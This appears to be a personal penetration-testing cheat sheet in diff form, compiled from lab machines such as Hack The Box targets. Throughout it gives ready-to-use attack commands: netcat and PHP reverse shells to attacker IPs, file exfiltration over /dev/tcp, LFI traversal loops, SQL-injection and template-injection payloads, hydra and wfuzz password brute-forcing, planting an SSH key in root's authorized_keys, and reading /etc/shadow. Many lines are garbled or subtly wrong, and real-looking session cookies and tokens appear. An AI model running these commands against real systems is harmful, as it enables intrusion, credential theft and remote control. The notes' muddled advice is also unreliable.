+#wfuzz brute force pin or number using wfuzz 
+
+ wfuzz -c -H "Cookie: XSRF-TOKEN=eyJpdiI6IkVtR3RkQzdhcC9Wc2ludi9YdGZBdGc9PSIsInZhbHVlIjoiYWJ6QWt6cWpxU3FWVzRSUUlyakFPVWhVNUFYL3gxNGEvRWVIR0o4NytaMWFhcVhXOE9lcEE5NUE0OWlrd2U4WXRvQkZyMitrZEhidXY5TlFsU0tLV2JIQ0lOOWpRNjhYMjBYdDVFNWVMME1JSHdTSVpyVTFtblY5emU4YlVhek8iLCJtYWMiOiI1MDFmNWRlYzZhOWYwNTRlNDBlYWE4ZDgxY2IxNDU1OTA5YjZjM2UyMGNjZDUzYTY3ZDk4ZDE5MzM4ZTY5NWM1IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InZoaXJBek9WbWJmZWplVVJZSjBYSFE9PSIsInZhbHVlIjoicVkwS3R0Sk5MYk5GMXVGbkVhZENmOHcwc1dESlBZeHZoTHFVeWptL0RyQUVXRjcwT1NTazJxQlNRK25lTTV5czVOd2hiZ1dDWXB2Qi9veDhjbkhUb0dVT05OVTJhUnhBQUY5b1ZFSkUrRzF6M2R6djRvbjBkNjVIL1N2d05vUFYiLCJtYWMiOiJlNWViNmE0MjI5MzllYTI4YTBhMzI3OGI2N2E5YWM1MDFkZWMwYzJiYzdkZTc2MTZlODE3NjZhNzAxZDRhM2Y0IiwidGFnIjoiIn0%3D"  -d "name=admin&pin=FUZZ"  -u http://10.10.11.159/api/resettoken -z range --zD 1000-9999
+
+
+#bypass rate-limit 
+ 
+ · Login
+
+· Reset Password
+
+· 2FA/OTP
+
+· Sign up
+
+· Sending messages, Pin code, Forums, comments, and coupon codes, etc. 
+ 
+
+# How to hide reponse in gobuster 403 
+
+gobuster dir --url http://10.10.11.159/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -x php -o http-dir.log -b 403,404 --wildcard switch
+ 
+
+#  7z commnad 
+
+7zip has a way to show more information about the files in the zip, using l for list, and -slt (which “Sets technical mode for l (list) command”, according to the man page). This gives a ton of information about each file in the archive:
+
+7z l -slt file.zip 
+
+# bypass rate limit 
+
+ ''In computer networks, rate limiting is used to control the rate of requests sent or received by a network interface controller. It can be used to prevent DoS attacks and limit web scraping''
+
+ prevent dos attack 
+
+# get request notes
+
+we need two spaces then get request is working .
+
+
+# bypass firewall techniq 
+
+ Doing the pentesting, if you see like server is blocking us for to many attempt 429 
+
+ remove User:Agent from the client site.. 
+
+
+# Process Investigation 
+
+first of all put the below command 
+
+ps -ef --forest check process id 
+
+then go /proc directory goto process directory check cat maps 
+
+# IF You are working with node js then you can use git command 
+
+git log 
+git show 
+
+always check .env file 
+
+
+#kill process in kali linux 
+
+kill -9 psid
+
+
+#how to search any file as expert .... within 
+
+#you can find out which software is released on which date 
+
+ # open google search any software that you want to search click the tools button 
+
+ # select hour and day which you want to see .... this 
+
+# How to jump 4 space suddenly 
+
+ use tab + number  for example tab + 5 if you press these number then you can easily jum
+
+
+#how to connect to mysql server remotly 
+
+mysql -u user.txt -p -D database -h 10.10.10.10  #this is command 
+
+#bad character in website secure for web 
+
+^{}[]\`<> this is bad character if you allow may be server will be compromised ... 
+
+' " sql injeciton 
+{}  template injeciton 
+
+
+#how to bypas waf firewall 
+
+"""
+Always use bad character to bypass whole firewall ~!@#$%^&*()-_+={}][|\`,./?;:'"<>
+
+"""
+
+#how to test waf firewall bypass bad character
+ 
+ wfuzz -c -u http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal -H 'Cookie: session=eyJjYXJ0X2l0ZW1zIjpbIjEiXSwidXVpZCI6IjEyOWY2MGVhLTMwY2YtNDA2NS1hZmI5LTZiZTQ1YWQzOGI3MyJ9.Yi8NDw.cel156uD2D01N6KGZLQ_LMVjj1U'  -d 'contact=FUZZ&message=welome' -w /usr/share/seclists/Fuzzing/special-chars.txt,urlencode  -t 1 -s .5   --sh 1607
+
+""""
+
+
+wfuzz -c -u http://spider.htb/a1836bb97e5f4ce6b3e8f25693c1a16c.unfinished.supportportal  -H 'Cookie: session=eyJjYXJ0X2l0ZW1zIjpbXSwidXVpZCI6IjEyOWY2MGVhLTMwY2YtNDA2NS1hZmI5LTZiZTQ1YWQzOGI3MyJ9.YjGTIw.9snQKIkhwNjr9ErYKWxZu6C2v3M' -d 'contact=FUZZ&message=d' -w /usr/share/seclists/Fuzzing/special-chars.txt -t 1 -s .5 --sh 1607
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                            
+=====================================================================
+
+000000013:   200        66 L     139 W      1607 Ch     "_"                                                                                
+000000024:   200        66 L     139 W      1607 Ch     "."                                                                                
+000000029:   200        66 L     139 W      1607 Ch     "'"                                                                                
+
+
+""""
+
+#bypass bad character using wfuzz
+
+
+
+
+#best sql injection payload:
+
+#select * from users where uuid = '{uuid}';
+
+ ' or 1=1-- -
+
+#how to create flask in linux 
+
+#decode jwt unsign cookie using flask 
+
+
+@ flask-unsign --decode --cookie 'eyJjYXJ0X2l0ZW1zIjpbIjEiXSwidXVpZCI6ImQxZDNmMDA4LWYyYmItNGQ2Yi05MzY1LWZhMzdiYWQ2ZjRhNiJ9'
+
+ output_   {'cart_items': ['1'], 'uuid': 'd1d3f008-f2bb-4d6b-9365-fa37bad6f4a6'}
+
+
+#Install python3 , python3.9-venv
+
+@ python3 -m venv /root/HTB-Boxes/Boxes/Linux/Hard/Spider/new/flask
+
+@  source ./bin/activate
+
+@ pip3 install Flask flask
+
+@ nano hello.py
+
+
+ """
+
+ from flask import Flask
+app = Flask(__name__)
+@app.route('/')
+def hello_world():
+    return 'Hello world!'
+
+
+""""
+
+
+@ export FLASK_APP=hello.py 
+
+@ flask run 
+
+################################################################
+
+
+
+#how to reconized sql injeciton bug 
+
+put single quato ' 
+put double quato "  
+
+'
+''
+"
+')
+")
+'-- -
+'-- --
+')-- -
+")-- -
+
+#select * from user where uuid {{uuid}}
+
+always test these code on server 
+
+test what is filtering server 
+
+#how to test ssti injection 
+#spider box
+{{4*4}}
+{{4*'4'}}
+{{config}}
+{{2*2}}[[3*3]]
+{{3*3}}
+{{3*'3'}}
+<%= 3 * 3 %>
+${6*6}
+${{3*3}}
+@(6+5)
+#{3*3}
+#{ 3 * 3}
+
+#KEEP IN MIND NOTE DOWN SOMETHINK Because it is very important to know for hacking 
+
+"""
+during to pentesting if you find out login or users in json or js file 
+
+then you can use to curl and post credential using curl command or python
+
+curl -X POST -u http://10.10.10.137:3000/login  -d '{"username":"admin","password":"any"}' -H 'Content-Type: Application/json'
+
+#get data from curl 
+
+ curl -X GET http://10.10.10.137:3000/users  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjQ2NjQ2OTIwLCJleHAiOjE2NDY3MzMzMjB9.q7iFKj4kVuDjP2vFM-9izB738ogVqdwRvu9zevuPImw" 
+[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"},{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]    
+
+#best website for post data in any form 
+
+https://reqbin.com/req/c-dwjszac0/curl-post-json-example
+
+"""
+
+#how to get best nmap result 
+
+nmap -sC -sV --stylesheet https://github.com/honze-net/nmap-bootstrap-xsl.git  10.10.10.137 
+
+#if python or python3 not exit in system then get stty trick remove restrict use script command
+
+script -q /dev/null sh 
+
+#if you want to see best hashcat result then with mode 
+
+hashcat -h | grep md5  -B 1 
+
+#find hidden file tree command 
+
+tree 
+
+#How  How to generate JWT/RSA tokens 
+
+openssl genrsa -out mykey.pem 4096
+
+openssl rsa -in mykey.pem -pubout -out pubkey.pem
+
+#always check cve detail for best hacking 
+
+https://www.cvedetails.com/product/20550/Canonical-Ubuntu-Linux.html?vendor_id=4781
+
+#nginx bydefault setup in nginx 
+
+server {
+        listen 80 default_server;
+        root /var/www/html;
+        server_name _;
+        location ~ \.php$ {
+                include snippets/fastcgi-php.conf;
+                fastcgi_pass unix:/var/run/php/php7.2-fpm.sock;
+        }
+        location / {
+                proxy_pass http://127.0.0.1:8080/;
+        }
+}
+
+
+
+#wfuzz urlencode 
+
+ wfuzz -c -u http://10.10.10.230/login  -d "username=admin&password=FUZZ" -w /opt/Sql_Inection/sql_injection.txt,urlencode --hw 101   
+
+#How to generate and play with jwt token generate public key and private key 
+
+ssh-keygen -t rsa -b 4096 -m PEM -f jwtRS256.key
+# Don't add passphrase
+openssl rsa -in jwtRS256.key -pubout -outform PEM -out jwtRS256.key.pub
+cat jwtRS256.key
+cat jwtRS256.key.pub
+
+
+
+#How to convert ssh key to .pem format 
+
+ssh-keygen -f id_rsa.pub -m 'PEM' -e > id_rsa.pub.pem
+
+
+#quic note for hacking 
+
+$ne is used mongodb which can used to bypass admin pannel mean not equat to 
+
+$regex is used to pattern matching most commnly is used for bruteforce hacking 
+
+$regexp is mysql and $regex is mongodb
+####################################
+
+
+""" How to create database in linux ubuntu using mysql 
+
+mysql -u root -p -h localhost
+
+
+CREATE USER 'pentest'@'localhost' IDENTIFIED BY 'virat';
+
+CREATE DATABASE javatpoint; #you can use your and
+
+GRANT ALL PRIVILEGES ON javatpoint.* TO 'pentest'@'localhost';
+
+mysql -u pentest -p -h localhost  #again login 
+
+source shop.sql; #this is sql script
+
+CREATE TABLE login ( ID int,username varchar(255),password varchar(255));
+INSERT INTO login (ID, username, password)VALUES (1, 'pentestblog', 'virat');
+ 
+""""""""""
+
+
+
+#how to select all test in nano text editor 
+
+use shift + down arrow key 
+use ctrl + shift = arrow up and down 
+#what is idor vulnerbilities in access control 
+
+in the idor bug you can access target directory without any restriction and you will  see senstive information 
+
+curl http://10.10.11.139:5000/articles/new      
+curl http://10.10.11.139:5000/articles/xml                        │┌──(root__kali)-[~/_/Boxes/Linux/Easy/NodeBlog]                          
+Found. Redirecting to /                                               │└─# curl http://10.10.11.139:5000/articles/new                           
+                                  
+
+#Create database and table using sql code 
+CREATE DATABASE oas;
+
+#then use below command in mysql 
+SET autocommit=0 ; source oas.sql ; COMMIT ;
+
+
+# how to cut test using cut -d "" 
+
+ curl -s  http://10.10.11.100/   | grep "<title>" | cut -d "<" -f 2| cut -d ">" -f 2    #this is cutter magic 
+
+#bruteforce attack on ssh smb using crackmapexec best bruteforce tool 
+
+crackmapexec ssh -ip -u user.txt -p "dsad"
+
+#port forwording using ssh 
+
+ use shift + ~C 
+
+
+#html javascrip and css source code beautify
+https://beautifier.io/
+
+#Open application quic using shorcut command 
+
+Alt + f2 > type application 
+
+#LINUX Privileage Escalaltion cheet sheet all command 
+
+#find any directory or file using find comand #find senstive file in linux #quick 
+
+find / -name user.txt 2>/dev/null
+
+#How many mountable shares can you identify on the target system?
+
+showmount -e  or showmount -e <ip> #in your terminal 
+
+#you can use target mount on local machine 
+
+mount -o rw <target-ip>:/mount /tmp/pentestblog  
+
+#get root shell 
+
+upload gcc -o pwn.c pwn > execute on target system 
+
+
+
+#ssrf vulnerbility 
+
+ Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.
+
+#serverside request forgery attack #localhost 
+
+0x7f000002 >  127.0.0.1
+0000::1    > 127.0.0.1
+
+### this file save it request use to url and take advantage ssrf 
+
+HTTP/1.1 301 MOVED PERMANENTLY
+Location: http://127.0.0.1
+
+########
+
+#How to Find subdomain in webiste using gobuster
+
+gobuster vhost --url  http://forge.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o sub-http-dir.log
+
+#How to find hidden credential , How to find leak service , How to find .backup file and permission only execution 
+
+"""
+www-data@monitors:/home/marcus$  grep -Ri .backup/ 
+grep: .backup: Permission denied
+grep: .gnupg: Permission denied
+grep: note.txt: Permission denied
+grep: user.txt: Permission denied
+grep: .cache: Permission denied
+www-data@monitors:/home/marcus$  grep -Ri .backup/  /home
+grep: /home/marcus/.backup: Permission denied
+grep: /home/marcus/.gnupg: Permission denied
+grep: /home/marcus/note.txt: Permission denied
+grep: /home/marcus/user.txt: Permission denied
+grep: /home/marcus/.cache: Permission denied
+www-data@monitors:/home/marcus$  grep -Ri .backup/  /home 2>/dev/null
+www-data@monitors:/home/marcus$  grep -Ri '.backup/'  /home 2>/dev/null
+www-data@monitors:/home/marcus$  grep -Ri '\.backup'  /home 2>/dev/null
+www-data@monitors:/home/marcus$  grep -Ri '\.backup'  /etc 2>/dev/null
+/etc/systemd/system/cacti-backup.service:ExecStart=/home/marcus/.backup/backup.sh
+/etc/alternatives/jsonpatch:            if args.backup:
+/etc/alternatives/jsonpatch:                if args.backup:
+
+"""
+
+#lfi process exploit 
+
+#lfi for loop for process enumeration 
+
+for url in $(seq 1 3000); do echo -n "$url:"; curl  http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../../../proc/$url/cmdline --output -; echo;  done
+
+
+/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../../../proc/self/cmdline
+
+curl -s http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../../../proc/self/cmdline --output -
+/usr/sbin/apache2-kstart 
+
+curl -s  http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=file:///proc/self/cmdline --output -        2 _
+/usr/sbin/apache2-kstart 
+
+#wordpress scanning good command 
+
+ wpscan --url http://monitors.htb -e ap,at --plugins-detection aggressive  -f cli-no-colour -t 40  
+
+#how to search in vi text editor 
+
+Alt + Shift + N = you can use to search 
+
+#nono search 
+
+Alt + w
+
+#HOW TO USE wordpress wpscan tool 
+
+wpscan --url http://monitors.htb/ --plugins-detection aggressive --wp-plugins-dir wp-content/plugins -e vp -e u
+
+#very important command
+
+for ip in /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin /usr/games /usr/local/games /snap/bin ; do ls -la --time-style=full| grep -v 000000000 | grep root; done 
+
+
+#how to decompress bzip2 and gzip and tar 
+
+# first you need to xxd -r file_name 
+
+#bzip2 decompress >>>  bzcat file_name using to decompress bzip2 data 
+
+#gzip decompress >>> zcat file_name using to decompress gzip data
+
+#tgz decompress >>> tar -xvf file_name using to decompress tar data
+
+
+#How to get all content any download any website using cewl tool 
+cewl http://10.10.10.150/ -w cewl.txt -v 
+
+
+#Capture Standard Input and Output using tee command
+
+cat /etc/passwd | tee passwd
+
+#Very Important command for pentesting 
+
+
+find / -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+
+find / -perm 777 -type f 2>/dev/null 
+
+#How to use gobuster tool? for best scanning 
+
+gobuster dir --url http://10.10.10.24/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html -t 30 -o http-dir.log
+
+
+#using sqlmap, how to enumerate user and password 
+
+sqlmap -r sql.req  --force-ssl -D admin -T users -C email,id,password,username --dump
+
+#force-ssl > for https 
+
+
+#log file in directory 
+
+#freebsd log file 
+
+/var/log/httpd-access.log
+
+#apach ubuntu linux
+
+ /var/log/apache2/access.log
+
+
+#RHEL / Red Hat / CentOS / Fedora Linux Apache access file location 
+
+/var/log/httpd/access_log
+
+#if file upload is on on phpinfo then you can exploit upload shell
+
+Content-Type: multipart/form-data; boundary=---------------------------7db268605aeContent-Length: 196-----------------------------7db268605aeContent-Disposition: form-data; name="dummyname"; filename="test.txt"Content-Type: text/plainSecurity Test-----------------------------7db268605ae
+
+
+#how to use vncviewver in kali linux
+
+vncviewer [-passwd passwd.txt] <IP>::5901
+
+
+#import note for backup.sh file using symbolic link 
+
+#!/bin/bash
+cd /home/pentestblog/work;
+tar -czvf tmp/backup_courses.tar.gz courses/*;
+cd tmp;
+tar -xf backup_courses.tar.gz;
+chmod 777 * -R;
+
+
+>>>>>>>>>>> to exploit this you can use 
+# create a new directory name is tmp 
+# use symbolic method attack file 
+# you can give 777 of any file 
+# ln -s /etc/shadow  /tmp  >>>>>>>>  create a symblock link in linux 
+
+
+#How to get all image hidden text using less commad 
+
+less *.png > if you type this command then you can see all hidden secret 
+
+#How to generate wordpress password using openssl 
+
+openssl passwd -1 'ippsec'
+
+
+#how to unzip jar file in java 
+
+unzip java.jar >>> 
+
+#How to read java.class file in txt readble format 
+
+use jd-gui >>> or jad 
+
+without unzip you can read class file using gd-gui
+
+#information gathering trick on ubuntu & nmap during 
+ find all package in apache and openssh 
+
+ #go to google and search these quearies #apache2 source package in Xenial > search on internet 
+
+
+#Port knocking technicq bypass using nmap #namp is good tool bypassing port kncoking technique ..
+
+for x in 4000 5000 6000; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 10.10.10.43 ; done
+  #4000 5000 6000 don't use these number check /etc/init.d/knockd or /etc/iptables folder & file 
+
+
+#fuzzing attack using wfuzz
+
+wfuzz  -c -u http://europacorp.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host:FUZZ.europacorp.htb"  --hc 20
+0
+
+#How to live capture see stream any wireshare or bruteforce attack - or hydra attack 
+
+wfuzz -c -u http://nineveh.htb/department/login.php -b 'PHPSESSID=58opdonm8rj0nakmq60rvbgrs5' -d 'username=admin&password=FUZZ' -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt > http-login-attack.txt
+
+
+#How to bruteforce phpliteadmin through hydra 
+
+hydra -l admin -P wordlist.txt 10.10.10.43 https-form-post "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64
+
+
+#BruteForce Attack through hydra 
+
+hydra 10.10.10.43 -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt http-form-post "/department/login.php:username=^USER^&password=^PASS^:Invalid"  -t 64
+
+
+
+#How to copy only password from rockyou.txst 
+
+ grep -i ^Password /usr/share/wordlists/rockyou.txt > wordlist.txt
+
+
+#how to uncompress data from image using binwalk 
+
+binwalk -eM file.png 
+
+
+#Copy Data through nc one system to another system 
+
+nc -nv 10.10.14.4 9002 < backup 
+nc -nvlp 9002 > bakcup 
+
+#How to use padbuster tool in kalilinux 
+
+padbuster  http://10.10.10.18/index.php 9BoSHOxV4h9DTs4u16caM0lmqvheiM8N 8 -cookies auth:9BoSHOxV4h9DTs4u16caM0lmqvheiM8N -plaintext user=hacker 
+
+#wfuzz bruteforce attack all request going to proxy 
+
+wfuzz -c -u http://10.10.10.18/login.php -b 'PHPSESSID=o5e68t8v64fmn4cjttndbq6406' -d 'username=admin&password=FUZZ' -w /usr/share/wordlists/rockyou.txt --hc  200 -p 127.0.0.1:8080
+
+
+#all machine madicine one code 
+
+for url in /usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin ; do ls -la --time-style=full $url ; done 
+
+
+#check only process 
+
+grep -a -v :$ pid.list | more
+
+
+#get process list through curl and for loop 
+
+for process in $(seq 0 2000); do echo -n "$process"; curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../..//proc/$process/cmdline --output - ; echo ; done  
+
+
+#magic byte image investigation 
+
+https://www.netspi.com/blog/technical/web-application-penetration-testing/magic-bytes-identifying-common-file-formats-at-a-glance/#:~:text=This%20is%20what's%20often%20called,is%20of%20the%20proper%20format.
+
+
+#Hydra Attack  If multiple user availble then try these command 
+
+hydra -L user.txt -P ../password.txt ssh://10.10.10.229 
+
+
+#wordpress author attack scenario 
+
+wfuzz -c -u http://spectra.htb/main/?author=FUZZ  -w number.txt | grep -v 404
+
+
+#Reverse shell topic before uploding reverse shell you should check these types process 
+
+curl http://10.10.14.3:9001
+
+
+
+#tcpdump 
+
+#how to capture any packet through tcpdump 
+
+################################################################################################
+
+tcpdump -i <interface> wlan0 -s0 <noDrop-packet> -w file.txt -C <file-size> 73773  
+
+ssh pentest@10.10.10.10.119 tcpdump -i <interface> wlan0 -s0 <noDrop-packet> -w- | wireshark -k - 
+
+##################################################################################################
+
+################################################################
+#File Transfer through reverse shell 
+
+cat pass.pcap > /dev/tcp/10.10.14.3/90001 >>> on Remote Server]
+
+nc -nvlp 9001 > wireshark.pcap
+
+##################################################################
+
+#How to gobuster for website fuzzing and dns checking and directory scanning 
+
+#dnschecking 
+
+gobuster dns -d google.com -w /usr/share/wordlists/dirbuster/rockyou.txt  
+
+#directory scanning 
+
+gobuster dir --url http://pentestblog.in -w /usr/share/wordlists/rockyout.txt 
+
+#fuzzing file inclution 
+
+gobuster fuzz -u https://example.com?FUZZ=test -w parameter-names.txt
+
+
+#How to import txt file in image 
+
+steghide embed -cf cvr.jpg -ef emb.txt
+
+
+#very Import command for suid check with permission
+
+find / -perm -u+s -type f -exec ls -l  2>/dev/null
+
+#how to change wordpress password # update wordpress password using mysql
+
+UPDATE wp_users SET user_pass = md5('new_password') WHERE ID = 1;
+
+
+#How to bypass waf firewall in wordpress website using wpscan 
+
+wpscan --url http://www.hirvikatu10.net/wordpress.1/ --random-user-agent 
+
+
+
+#How to do perform bruteforce attack on smtp service using smtp perl script
+
+./send_mail.pl -U /usr/share/seclists/Usernames/CommonAdminBase64.txt -M VRFY -f orestis@brainfuck.htb -t 10.10.10.17 -v                1 ⨯ 2 ⚙
+
+
+
+
+
+#How take write ssh file in other boxs if ssh is not writing 
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+ssh-keygen -f europa 
+
+### These change are set to remote boxe ##########
+
+echo -n 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/lYqTX4sIOjR6bmT14VN9waxlhY6cJgUUyjwVjOrxbSiFKV4beIFFm3X0bzI/MY9IYhr3U/6Jr1ZRC8lIAn4BW2LWN3I/kNRjVtp62uBNLtmvpzUs70wMlR64DTAycRlTvLzkaAevIboe8Ws4+ChOqGlHK0afH+kmMGYylFTWqbQzmegINlB0jL+GxwmZBhK2oHBAvglvKv33Zm7uWCB8/+8bZWTFQEGmEGg9OMqBX02ituVbXPdnkXk6487YLzFybje5mdCn2IfkbkyvH7j2SaVc+tUOWO9qwSh46S4swtAvEm51hIDEUWnwUXSTp66QzxqbkCqS78bDdZAqUE0J34euatF3nrlSRqIz9sN9UYBM232M8WmGWaO+SeIwY1RCcbUZSqYs5LGDtdlouh0JOYTb6SwcgBLWCIX4F2SCgHxdhcmHWv6EQzmPNrEsX72yq050Db8bkpcugYpvqJOzqTBITmrfsYBHlyxcWzYOQ3EvUyFDP4YOFBa8I2tnoec= root@kali' > /root/.ssh/authorized_keys
+
+chmod 700 authorized_keys
+
+##################################################
+
+#Attacker Box
+
+chmod 600 private id_rsa
+
+########## ssh -i id_rsa root@10.10.10.22 
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+#How to take screen shot at specific picture in kali linux 
+
+ctrl+alt+prtscreen
+
+
+#Very Important command 
+
+#How to open any file through command line 
+
+ xdg-open file | xdg-open url  
+
+#How to search single file through 
+
+grep -Ril "allow_url_include" . 
+
+#How to change , in number of line
+
+%s/,/\r/g >>>> convert , to line
+
+#php variable-writable-script
+
+#how to forword port through ssh 
+
+└─# ssh -D 1080 -L 6801:127.0.0.1:5901  charix@10.10.10.84                                                                     255 ⨯
+
+
+#How to bruteforce website login using hydra tool
+
+hydra -l admin -P wordlists/wordlist.txt 10.10.10.75  http-post-form "/nibbleblog/admin.php:username=admin&password=^PASS^:Incorrect username or password"
+
+
+#How to read file using curl 
+
+curl file:///etc/passwd 
+curl file:///etc/shadow
+
+#how to hold screen and watch service 
+
+watch -n 1 cat report 
+
+
+
+
+#How to scan directory through gobouster #gobuster
+
+ gobuster dir --url http://10.10.10.68/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t200 --no-error
+
+# Shell Restrictions
+
+shell_exec($_POST['cmd']." 2>&1"));
+
+#why shell restriction possible... 
+#preg_split function in php
+" preg_split(
+    string $pattern,
+    string $subject,
+    int $limit = -1,
+    int $flags = 0
+): array|false
+" 
+#netcat reverse_shell
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.24 1234 >/tmp/f
+
+#Text copy through xclip #terminal text copy
+cat pentest.txt | xclip
+
+#Reverse_shell through php
+ 
+php -r '$sock=fsockopen("10.10.13.24php -r '$sock=fsockopen("10.10.13.24",1234);exec("/bin/sh -i <&3 >&3 2>&3");'",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
+#If No:(Password) sudo -l 
+sudo -u <sandeep> bash 
+
+
+#Irked CTF 
+
+If port #111 #RPC is enable then find out another port 
+
+#Jpg image enumration 
+stegnohide, binwalk, steghide, exiftool, 
+
+
+#Bypass tab order restriction 
+ctrl+z "stty raw -echo; fg" enter
+
+#how to exract passphares form image 
+steghide extract -sf irked.jpg 
+
+#how to embed txt file in image
+steghide embed -cf irked.jpg -ef ctf.txt
+
+#how to find txt img file
+find . | grep -i irked.jpg  
+ls | grep -i user.txt
+
+#how to talk irc server through netcat 
+
+ echo "AB; ping -c 2 10.10.14.24" | ncat 10.10.10.117 8067 
+ tcpdump -i tun0 icmp   
+
+#how to talk irc 
+PASS pentest
+NICK penstes
+USER penedask jdakfdj jdska :pentest
+
+
+#suid binary 
+
+find / -perm -u+s -type f 2>/dev/null
+
+#how to get root on terminal 
+
+#!/bin/bash 
+  bash 
+
+
+#Suppose you want to find out exact directory version then you should use 
+
+ grep -R love /usr/share/wordlists/rockyou.txt | awk -F: '{ print $1}' | sort  -urn
+
+#How to use Dig Command
+dig axfr @10.10.10.29  bank.htb
+
+#search file uniq code
+wc -c *.acc  | sort -rnu 
+
+
+#How to grep title or another line
+curl -s  http://10.10.10.10/index.php/jobs/apply/8/ | grep '<title>' 
+
+#wpscan how to user 
+wpscan --url http://10.10.10.10 --enumerate at (theams enumeration)
+
+#How to use wfuzz
+wfuzz -u http://10.10.10.10 -d 'postdate'  -w /usr/share/wordlists/rockyou.txt
+
+#How to use Bash Script 
+ for ip in $(seq 1 10); do curl -s  http://10.10.10.10/index.php/jobs/apply/$ip/ | grep '<title>'; done
+
+#Check process on your computer 
+ ps -ef | grep root
+
+#How to check memory or file running process 
+ df -h 
+
+#How to find deleted file through strings commands 
+ strings /dev/sdb 
+
+
+#How to use wfuzz command and grep user password through data 
+
+wfuzz -c -u http://10.10.10.153/moodle/login/index.php -d 'anchor=&username=Giovanni&password=Th4C00lTheachaFUZZ' -w /usr/share/wordlists/wfuzz/stress/alphanum_case_extra.txt --hh 440
+
+#How to copy file one computer to another through ssh command 
+ scp usr_pass.txt charix@10.10.10.84:/tmp 
+
+ scp <filename>  usr@<ip>:path
+
+#How to Reverse Copy to target machine 
+
+scp charix@10.10.10.84:secret.zip .
+
+scp usr@<ip>:file_name /root/path
+
+
+#How to check process 
+ps aux , netstat -antp #check memory df -h 
+
+#How to connect kali linnux through vncviewer 
+ vncviewer localhost:5900
+
+#how to find all images ascii in 1 second 
+ ls -la | file *
+
+#How to find exact and uniq number 
+cat dir.txt| grep 403
+
+#How to find extact bugs in website or any other 
+  check cve details 
+
+#How to access any file through browser 
+
+ file://config
+
+#How to see all google chrome secret with browser 
+ 
+ chrome://version chrome://site-engagement chrome://kill chrome://restart
+ chrome://chrome-urls/ 
+
+#How to check active listner in kali linux
+ netstat -an | grep LIST
+
+# how to connect vncviewer server
+
+ vncviewer -passwd secret 127.0.0.1::5901
+
+#netcat reverse shell
+
+nc -e /bin/sh 10.10.14.24 9001
+
+#Suppose you want to find out exact directory version then you should use 
+
+ grep -R love /usr/share/wordlists/rockyou.txt | awk -F: '{ print $1}' | sort  -urn
+
+#Netcat Reliable shell
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 1234 >/tmp/f
+
+#how to extact data from database 
+
+show databases;
+use sandeep;
+show tables;
+SELECT id, username, password FROM mdl_user; >>> This is best for every 
+SELECT * from mdl_user/G
+select id,username,password from eslfu_users;
+describe eslfu_users;
+
+
+#How to crack hash using hashcat 
+
+hashcat -h  | grep md5 
+
+
+#How to go deep scanning in network 
+ nmap -sC -sV -p- 10.10.10.76  --max-retries 1
+
+#There are second way that we know this 
+ nmap -p- 10.10.10.76 --max-retries 1
+
+nmap -p 79,111,22022 -sC -sV 10.10.10.79 
+
+nmap -p- 10.10.10.76 --max-retries 0  
+
+nmap -vv --reason -Pn -A --osscan-guess --version-all -p-  10.10.10.247 
+
+-sA = scan all filterport (only filter)
+-sI = idle scan can't trace user because it's not send any packet. <Zommbies>
+
+
+masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.150 -e tun0 > ports
+
+#How to scan all wordpress theam new command 
+
+ wpscan https://pentestblog.in --disable-tls-checks
+
+# Basic command 
+ 
+ less -s 
+
+
+# Nmap Deep Scaning command 
+nmap -p-  10.10.10.76 -A --max-retries 0  
+
+
+#Best Brutefoce tool 
+ 
+Patator is bruteforce tool 
+
+
+# How to login with keyexhange algorithms 
+
+-okexAlgorithms=+diffie-hellman-group1-sha1  
+
+# How to enumerate finger service 
+
+ ./finger-user-enum.pl -U user.txt -t 10.10.10.76       
+
+#hydra is not working when become enable like ssh keyexchange method 
+
+ hydra -l sunny -p sunday ssh://10.10.10.76:22022
+
+#FInger Service 
+
+ ./finger-user-enum.pl -u root -t 10.10.10.76           
+
+#patator tool help 
+
+ patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=user.txt persistent=0 
+
+#gobuster deep scanning 
+gobuster dir --url https://pentestblog.in -w /usr/share/wordlist/rock --no-error --delay 1500ms
+
+#How to generate specific wordlist using cewl tool 
